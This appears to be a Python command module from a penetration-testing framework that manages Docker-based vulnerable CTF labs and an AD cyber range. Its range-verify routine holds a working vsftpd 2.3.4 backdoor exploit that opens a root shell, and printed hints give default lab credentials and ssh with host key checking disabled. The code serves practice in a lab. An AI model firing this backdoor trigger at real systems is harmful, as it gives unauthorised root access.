"""Lab environment commands -- spin up vulnerable practice targets.

Provides on-demand CTF-style lab scenarios powered by Docker containers.
Operators can practice techniques against realistic targets without
risking production systems. The Docker lifecycle lives in
:mod:`modules.lab_runtime`; this command set owns the operator UX.
"""

from __future__ import annotations

import socket
import subprocess
import time

import cmd2

from cli.commands._base import LazyOwnCommandSet
from modules import lab_runtime
from utils import (
    miscellaneous_category,
    print_error,
    print_msg,
    print_warn,
)


class LabCommandSet(LazyOwnCommandSet):
    """Manage local CTF lab environments via Docker."""

    phase = "lab"
    category = "12. Miscellaneous"

    def _docker_available(self) -> bool:
        """Check if Docker is installed and the daemon is reachable."""
        return lab_runtime.docker_available()

    def _running_containers(self) -> list[str]:
        """Return list of running lab container names."""
        return lab_runtime.running_containers()

    def _running_range_containers(self) -> list[str]:
        """Return list of running cyber range container names."""
        return lab_runtime.running_range_containers()

    def _container_name(self, scenario: str) -> str:
        """Return the container name for a given scenario."""
        return lab_runtime.container_name(scenario)

    def _container_ip(self, container_name: str) -> str:
        """Resolve a lab container IP on its Docker network."""
        return lab_runtime.container_ip(container_name)

    def _lab_ensure_web(self, scenario: str, container_name: str) -> None:
        """Bring the lab web stack up when the image booted without it."""
        lab_runtime.ensure_web(scenario, container_name)

    def _print_lab_target(self, scenario: str, container_name: str, ports: dict) -> None:
        """Print the target IP and the host-mapped ports for one lab."""
        ip = self._container_ip(container_name)
        if ip:
            print_msg(f"[*] Container IP: {ip}")
            print_msg(f"[*] Assign target: assign rhost {ip}")
        else:
            print_warn(f"Container IP unavailable for {container_name}; inspect with: docker inspect {container_name}")
        if ports:
            print_msg("[*] Host-mapped ports:")
            for container_port, host_port in ports.items():
                print_msg(f"    {host_port} -> {container_port}")
        if ip:
            print_msg("[*] Prefer the container IP for native ports in apt_chain/gym chains.")
            print_msg("[*] Use 127.0.0.1 with the mapped ports only when the tool needs a host port.")
        if scenario == "metasploitable":
            print_msg("[*] Quick start: assign rhost <container-ip> && lazynmap")
        elif scenario in ("wordpress", "juice-shop", "tomcat", "struts"):
            port = list(ports.values())[0] if ports else ""
            print_msg(f"[*] Quick start: ww && gobuster  (url http://127.0.0.1:{port})")

    def _lab_migrate(self, scenario: str, container_name: str) -> None:
        """Apply gym migrations to the metasploitable lab container."""
        if scenario != "metasploitable":
            return
        print_msg("[*] Applying gym migrations...")
        report = lab_runtime.apply_gym_migrations(container_name)
        for migration_id, step in report.items():
            if step.get("skipped"):
                print_msg(f"    [skip] {migration_id}: already applied")
            elif step.get("applied"):
                print_msg(f"    [ ok ] {migration_id}")
            else:
                print_warn(f"    [FAIL] {migration_id}: {step.get('detail', '')[:120]}")

    @cmd2.with_category(miscellaneous_category)
    def do_lab(self, line):
        """Manage local CTF practice labs.

        Usage:
            lab list                     — show available scenarios
            lab start <scenario>         — spin up a vulnerable target
            lab stop <scenario>          — tear down a running scenario
            lab status                   — show running labs
            lab range start <profile>    — start a cyber range (ad-mini)
            lab range stop <profile>     — stop a cyber range
            lab range status             — range container status
            lab range verify <profile>   — fire a real exploit to prove it works

        Examples:
            lab start metasploitable
            lab start wordpress
            lab list
            lab status
            lab stop metasploitable
            lab range start ad-mini

        Requires Docker. Lab containers are isolated and safe for practice.
        """
        args = line.strip().split()
        if not args:
            print_msg("Usage: lab [list|start|stop|status|range] [scenario]")
            print_msg("Try: lab list")
            return

        action = args[0].lower()
        scenario = args[1] if len(args) > 1 else ""

        if action == "range":
            self._range_dispatch(args[1:])
        elif action == "list":
            self._lab_list()
            self._range_list()
        elif action == "start":
            if not scenario:
                print_error("Specify a scenario. Try: lab list")
                return
            self._lab_start(scenario)
        elif action == "stop":
            if not scenario:
                print_error("Specify a scenario. Try: lab status")
                return
            self._lab_stop(scenario)
        elif action == "status":
            self._lab_status()
        else:
            print_error(f"Unknown action: {action}. Use list, start, stop, status, or range.")

    def _lab_list(self):
        """Display available lab scenarios."""
        print_msg("\nAvailable lab scenarios:\n")
        for name, info in lab_runtime.LAB_SCENARIOS.items():
            difficulty = info.get("difficulty", "unknown")
            desc = info.get("description", "")
            ports = ", ".join(info.get("ports", {}).keys())
            print_msg(f"  {name:<20} [{difficulty:<8}] {desc}")
            print_msg(f"  {'':20}  ports: {ports}")
        print_msg("")
        print_msg("Use: lab start <scenario> to spin one up.")
        if not self._docker_available():
            print_warn("Docker not detected. Install Docker to use lab scenarios.")

    def _lab_start(self, scenario: str):
        """Spin up a lab scenario container."""
        if scenario not in lab_runtime.LAB_SCENARIOS:
            print_error(f"Unknown scenario: {scenario}. Use 'lab list' to see options.")
            return

        if not self._docker_available():
            print_error("Docker is required to start lab scenarios.")
            print_error("Install: sudo apt install docker.io && sudo systemctl start docker")
            return

        info = lab_runtime.LAB_SCENARIOS[scenario]
        image = info["image"]
        ports = info.get("ports", {})

        running = self._running_containers()
        container_name = lab_runtime.container_name(scenario)
        if container_name in running:
            print_warn(f"Lab '{scenario}' is already running.")
            self._lab_ensure_web(scenario, container_name)
            self._lab_migrate(scenario, container_name)
            self._print_lab_target(scenario, container_name, ports)
            return

        print_msg(f"Pulling image {image} ...")
        result = lab_runtime.start(scenario)

        if result.get("success"):
            container_id = ""
            try:
                inspect = subprocess.run(
                    ["docker", "inspect", "--format", "{{.Id}}", container_name],
                    capture_output=True,
                    text=True,
                    timeout=15,
                    check=False,
                )
                container_id = (inspect.stdout or "").strip()[:12] if inspect.returncode == 0 else ""
            except (OSError, ValueError):
                container_id = ""
            print_msg(f"Lab '{scenario}' started. Container: {container_id}")
            self._lab_migrate(scenario, container_name)
            self._print_lab_target(scenario, container_name, ports)
        else:
            print_error(f"Failed to start lab '{scenario}': {result.get('error', '')}")

    def _lab_stop(self, scenario: str):
        """Stop a running lab scenario."""
        result = lab_runtime.stop(scenario)
        if not result.get("success"):
            print_warn(
                f"Lab '{scenario}' is not running."
                if "not running" in result.get("error", "")
                else f"Failed to stop lab '{scenario}': {result.get('error', '')}"
            )
            return
        print_msg(f"Stopping lab: {scenario}")
        print_msg(f"Lab '{scenario}' stopped.")

    def _range_dispatch(self, args: list[str]) -> None:
        """Dispatch ``lab range`` subcommands.

        Args:
            args: Tokens after ``range`` (start|stop|status + profile).
        """
        if not args:
            print_msg("Usage: lab range [start|stop|status] [profile]")
            self._range_list()
            return
        action = args[0].lower()
        profile = args[1] if len(args) > 1 else ""
        if action == "start":
            if not profile:
                print_error("Specify a range profile. Try: lab range start ad-mini")
                return
            self._range_start(profile)
        elif action == "stop":
            if not profile:
                print_error("Specify a range profile.")
                return
            self._range_stop(profile)
        elif action == "status":
            self._range_status()
        elif action == "verify":
            if not profile:
                print_error("Specify a range profile. Try: lab range verify ad-mini")
                return
            self._range_verify(profile)
        else:
            print_error(f"Unknown range action: {action}")

    def _range_list(self) -> None:
        """Display available cyber range profiles."""
        print_msg("\nAvailable range profiles:\n")
        for name, info in lab_runtime.RANGE_PROFILES.items():
            print_msg(f"  {name:<20} [{info.get('difficulty', ''):<8}] {info.get('description', '')}")
            print_msg(f"  {'':20}  topology: {info.get('topology', '')}")
        print_msg("")
        print_msg("Use: lab range start ad-mini")

    def _range_start(self, profile: str) -> None:
        """Start a cyber range profile via Docker Compose.

        Args:
            profile: Range profile name.
        """
        if not self._docker_available():
            print_error("Docker is required to start ranges.")
            return
        compose = lab_runtime.range_compose(profile)
        if compose is None:
            print_error(f"Unknown range profile: {profile}. Available: {list(lab_runtime.RANGE_PROFILES)}")
            return
        result = lab_runtime.start_range(profile)
        if not result.get("success"):
            print_error(f"Failed to start range '{profile}': {result.get('error', '')}")
            return
        admin_password = result.get("admin_password", "")
        if admin_password:
            print_msg(f"[*] Range Administrator password: {admin_password} (per-deployment, disposable)")
        print_msg(f"Range '{profile}' started.")
        self._range_wait_healthy(compose)
        ws_ip = self._range_container_ip("lazyown-range-ws01")
        if ws_ip:
            print_msg(f"[*] Assign target: assign rhost {ws_ip}")
        else:
            print_msg("[*] Assign target: inspect ws01 with: docker inspect lazyown-range-ws01")
        print_msg("[*] From THIS host use 127.0.0.1 with mapped ports (internal IPs live inside the range net):")
        print_msg(
            "    ssh -p 2222 -o HostKeyAlgorithms=+ssh-rsa -o StrictHostKeyChecking=no msfadmin@127.0.0.1  # pass: msfadmin"
        )
        print_msg("    ftp 127.0.0.1 2121                        # vsftpd 2.3.4, backdoor shell on 6200")
        print_msg("    smbclient -L //127.0.0.1 -P 1445 -N")
        print_msg("    curl http://127.0.0.1:8081/")
        print_msg("[*] With the range IP use native ports: ssh msfadmin@<ws01-ip> (port 22, same legacy key option)")
        print_msg("[*] Practice: gym start first_implant && gym start lateral_ad")

    def _range_container_state(self, container: str) -> str:
        """Read a container's lifecycle state.

        Args:
            container: Container name to inspect.

        Returns:
            State string (``running``, ``restarting``, ...) or empty.
        """
        import subprocess

        try:
            result = subprocess.run(
                ["docker", "inspect", "--format", "{{.State.Status}}", container],
                capture_output=True,
                text=True,
                timeout=15,
                check=False,
            )
        except (FileNotFoundError, subprocess.TimeoutExpired, OSError):
            return ""
        if result.returncode != 0:
            return ""
        return result.stdout.strip()

    def _range_wait_healthy(self, compose, timeout: int = 180) -> None:
        """Wait for range containers to run and probe host-side ports.

        Polls the DC and workstation states, then TCP-probes the published
        SSH and LDAP ports from this host so the operator knows the range
        is reachable before practicing.

        Args:
            compose: Compose file of the range profile (unused for probing,
                kept for future per-profile port tables).
            timeout: Maximum seconds to wait for ``running`` state.
        """
        _ = compose
        deadline = time.time() + timeout
        states: dict[str, str] = {}
        while time.time() < deadline:
            states = {
                "lazyown-range-dc": self._range_container_state("lazyown-range-dc"),
                "lazyown-range-ws01": self._range_container_state("lazyown-range-ws01"),
            }
            if all(state == "running" for state in states.values()):
                break
            time.sleep(5)
        for container, state in states.items():
            if state != "running":
                print_warn(f"{container} is '{state or 'missing'}', expected 'running'. See: docker logs {container}")
        for host, port, label in (("127.0.0.1", 2222, "ws01 ssh"), ("127.0.0.1", 389, "dc ldap")):
            if self._tcp_reachable(host, port):
                print_msg(f"[*] Reachable: {label} on {host}:{port}")
            else:
                print_warn(f"Unreachable: {label} on {host}:{port} (still provisioning? retry in 60s)")

    def _range_verify(self, profile: str) -> None:
        """Prove the range is exploitable by firing a real exploit.

        For ``ad-mini`` this triggers the vsftpd 2.3.4 backdoor on ws01
        from this host and checks the shell answers ``uid=0``. This is a
        proof-of-exploit, not a banner check.

        Args:
            profile: Range profile name.
        """
        if profile != "ad-mini":
            print_error(f"No verifier for profile: {profile}")
            return
        print_msg("[*] Firing vsftpd 2.3.4 backdoor against 127.0.0.1:2121 ...")
        answer = ""
        try:
            with socket.create_connection(("127.0.0.1", 2121), timeout=10) as ftp:
                ftp.recv(1024)
                ftp.sendall(b"USER backdoor:)\r\n")
                ftp.recv(1024)
                ftp.sendall(b"PASS anything\r\n")
                time.sleep(2)
            time.sleep(2)
            with socket.create_connection(("127.0.0.1", 6200), timeout=10) as shell:
                shell.sendall(b"id\n")
                time.sleep(1)
                answer = shell.recv(4096).decode(errors="replace")
        except OSError as exc:
            print_error(f"Exploit failed (is the range up?): {exc}")
            return
        if "uid=0" in answer:
            print_msg(f"[*] Root shell confirmed on ws01: {answer.strip().splitlines()[0]}")
            print_msg("[*] Range is live and exploitable. Next: gym start first_implant")
        else:
            print_error(f"Shell answered unexpectedly: {answer.strip()[:200]}")

    @staticmethod
    def _tcp_reachable(host: str, port: int, timeout: float = 3.0) -> bool:
        """Probe one TCP port from this host.

        Args:
            host: Hostname or IP to probe.
            port: Port to probe.
            timeout: Connection timeout in seconds.

        Returns:
            True when the connection succeeds.
        """
        try:
            with socket.create_connection((host, port), timeout=timeout):
                return True
        except OSError:
            return False

    def _range_container_ip(self, container: str) -> str:
        """Resolve a range container's IP on its compose network.

        Args:
            container: Container name to inspect.

        Returns:
            IPv4 address string, or empty when unavailable.
        """
        return lab_runtime.container_ip(container)

    def _range_stop(self, profile: str) -> None:
        """Stop a cyber range profile.

        Args:
            profile: Range profile name.
        """
        print_msg(f"Stopping range: {profile}")
        result = lab_runtime.stop_range(profile)
        if not result.get("success"):
            print_error(f"Failed to stop range '{profile}': {result.get('error', '')}")
            return
        print_msg(f"Range '{profile}' stopped.")

    def _range_status(self) -> None:
        """Show range container status."""
        running = self._running_range_containers()
        if not running:
            print_msg("No ranges running. Use: lab range start ad-mini")
            return
        print_msg("\nRunning ranges:\n")
        for container_name in running:
            print_msg(f"  {container_name}")
        print_msg("")

    def _lab_container_state(self, container_name: str) -> str:
        """Read one lab container lifecycle state."""
        try:
            result = subprocess.run(
                ["docker", "inspect", "--format", "{{.State.Status}}", container_name],
                capture_output=True,
                text=True,
                timeout=5,
                check=False,
            )
        except (FileNotFoundError, subprocess.TimeoutExpired, OSError):
            return ""
        return result.stdout.strip() if result.returncode == 0 else "unknown"

    def _lab_status(self):
        """Show currently running lab containers."""
        if not self._docker_available():
            print_error("Docker is required to check lab status.")
            return

        running = self._running_containers()
        if not running:
            print_msg("No labs running.")
            print_msg("Use: lab list && lab start <scenario>")
            return

        print_msg("\nRunning labs:\n")
        for container_name in running:
            scenario = container_name.replace(lab_runtime.REGISTRY_PREFIX, "")
            info = lab_runtime.LAB_SCENARIOS.get(scenario, {})
            ports = info.get("ports", {})

            status = self._lab_container_state(container_name) or "unknown"

            ip = self._container_ip(container_name)
            print_msg(f"  {scenario:<20} [{status}] {info.get('description', '')}")
            print_msg(f"  {'':20}  ip: {ip or 'unavailable'}")
            if ip:
                print_msg(f"  {'':20}  assign rhost {ip}")
            if ports:
                for container_port, host_port in ports.items():
                    print_msg(f"  {'':20}  {host_port} -> {container_port}")
        print_msg("")
        print_msg("Use: lab stop <scenario> to tear one down.")
